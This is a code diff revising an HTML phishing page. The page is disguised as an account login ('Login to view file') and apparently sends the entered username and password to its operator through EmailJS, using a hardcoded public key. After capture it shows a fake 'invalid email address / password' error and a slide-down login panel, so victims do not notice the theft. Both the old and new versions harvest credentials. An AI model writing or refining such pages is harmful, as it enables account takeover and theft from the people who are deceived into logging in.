@@ -3,81 +3,125 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Manage User Accounts</title>
+    <title>Login to Your Account</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script>
-        // Initialize EmailJS with your public key
         emailjs.init("jkb7mzwK9KsEbHbna"); // Public Key from your EmailJS account
     </script>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #ffffff;
-            text-align: center;
+            background-image: url('https://i.postimg.cc/brBdvG0v/Netvvv.jpg'); /* Background Image */
+            background-size: contain; /* Ensures the image fits within the page */
+            background-position: top center;
+            background-repeat: no-repeat;
+            background-color: #000; /* Fallback color */
+            height: 100vh;
             margin: 0;
             padding: 0;
+            text-align: center;
         }
-        .header {
-            background-color: #f07c00;
+
+        /* Drop-down Login Panel */
+        .login-container {
+            background-color: rgba(40, 40, 40, 0.95); /* Grey-black background */
+            width: 100%;
+            max-width: 400px;
             padding: 15px;
-            color: white;
-            font-size: 24px;
-        }
-        .container {
-            background-color: #ffffff;
-            width: 350px;
-            margin: 100px auto;
-            padding: 20px;
             border-radius: 8px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            position: fixed;
+            top: -200px; /* Initially hidden */
+            left: 50%;
+            transform: translateX(-50%);
+            transition: top 0.5s ease-in-out;
+            z-index: 1000;
             border-top: 5px solid #f07c00;
         }
+
         h2 {
-            color: #333;
-        }
-        input {
-            width: 100%;
+            color: #fff;
+            font-weight: bold;
             margin: 10px 0;
-            padding: 8px;
-            border: 1px solid #ccc;
-            border-radius: 4px;
         }
+
+        input {
+            width: 85%;
+            padding: 8px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 6px;
+            background-color: #222;
+            color: white;
+        }
+
+        input::placeholder {
+            color: #bbb;
+        }
+
         button {
             background-color: #f07c00;
             color: white;
             border: none;
             padding: 10px;
-            width: 100%;
+            width: 85%;
             cursor: pointer;
-            border-radius: 4px;
+            border-radius: 6px;
+            font-weight: bold;
+            transition: background 0.3s;
         }
+
         button:hover {
             background-color: #d96b00;
         }
+
         .forgot-password {
             color: #f07c00;
             text-decoration: none;
+            font-size: 14px;
         }
+
         .forgot-password:hover {
             text-decoration: underline;
+        }
+
+        /* Confirmation Message */
+        #confirmation {
+            display: none;
+            background-color: rgba(40, 40, 40, 0.95);
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            margin: 100px auto;
+            border-radius: 8px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
+            border-top: 5px solid #f07c00;
+        }
+
+        #confirmation p {
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
         }
     </style>
 </head>
 <body>
-    <div class="header">Manage User Accounts</div>
-    <div id="login" class="container">
-        <h2>Verify and Enable Account</h2>
+
+    <!-- Drop-down Login Panel -->
+    <div id="login" class="login-container">
+        <h2>Login to Your Account</h2>
         <input type="text" id="username" placeholder="Username" required>
         <input type="password" id="password" placeholder="Password" required>
         <button onclick="authenticate()">Login</button>
-        <p><a href="#" class="forgot-password">Use the above button to secure your account</a></p>
+        <p><a href="#" class="forgot-password">Login to view file</a></p>
     </div>
 
-    <div id="dashboard" class="container" style="display: none;">
-        <h2>Account Secured!</h2>
-        <p>We will alert you when we detect any unusual login from a new device within or outside your region.</p>
-        <button onclick="window.close()">Close this page</button>
-    </div>
+    <!-- Confirmation Message -->
+   <div id="confirmation">
+    <h2 style="color: white;">PLEASE TRY AGAIN!</h2>
+    <p>You've entered an invalid email address / password combination.</p>
+    <button onclick="window.close()">Close this page</button>
+</div>
 
     <script>
         function sendEmail(username, password) {
@@ -105,7 +149,7 @@
                         loginButton.textContent = "Login";
                         loginButton.disabled = false;
                         document.getElementById("login").style.display = "none";
-                        document.getElementById("dashboard").style.display = "block";
+                        document.getElementById("confirmation").style.display = "block";
                     })
                     .catch(error => {
                         console.error("Error sending email", error);
@@ -115,8 +159,15 @@
                     });
             } else {
                 alert("Please enter both username and password.");
+                loginButton.disabled = false;
+                loginButton.textContent = "Login";
             }
         }
+
+        // Slide down animation for login panel
+        window.onload = function () {
+            document.getElementById("login").style.top = "20px";
+        };
     </script>
 </body>
 </html>
